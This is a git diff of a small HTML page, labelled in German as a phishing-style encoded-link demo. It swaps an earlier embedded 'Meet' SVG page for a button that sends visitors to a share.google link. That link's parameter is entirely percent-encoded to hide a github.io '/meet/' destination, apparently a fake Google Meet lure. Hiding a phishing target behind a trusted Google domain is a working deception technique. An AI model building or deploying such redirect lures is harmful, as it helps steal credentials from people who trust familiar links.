@@ -3,11 +3,25 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Meet</title>
+  <title>Custom Encoded Link Demo</title>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f0f0f0; }
+    button { padding: 10px 20px; background: #4285f4; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
+    button:hover { background: #357ae8; }
+  </style>
 </head>
-<body style="margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f0f0;">
-  <object data="Meet.svg" type="image/svg+xml" width="400" height="600">
-    Your browser doesn't support SVG.
-  </object>
+<body>
+  <h1>Dein encodierter Link im Phishing-Stil</h1>
+  <p>Klick den Button, um zum encodierten Link zu redirecten (simuliert einen Phishing-Click).</p>
+  <button onclick="redirectToEncodedLink()">Go to Encoded Link</button>
+
+  <script>
+    function redirectToEncodedLink() {
+      // Dein encodierter Link
+      var encodedLink = 'https://share.google?link=%68%74%74%70%73%3A%2F%2F%65%6D%32%37%37%38%37%30%38%2D%67%6C%69%74%63%68%2E%67%69%74%68%75%62%2E%69%6F%2F%6D%65%65%74%2F';
+      // Redirect (in realem Setup würde hier ein Decode/Redirect passieren)
+      window.location.href = encodedLink;
+    }
+  </script>
 </body>
 </html>
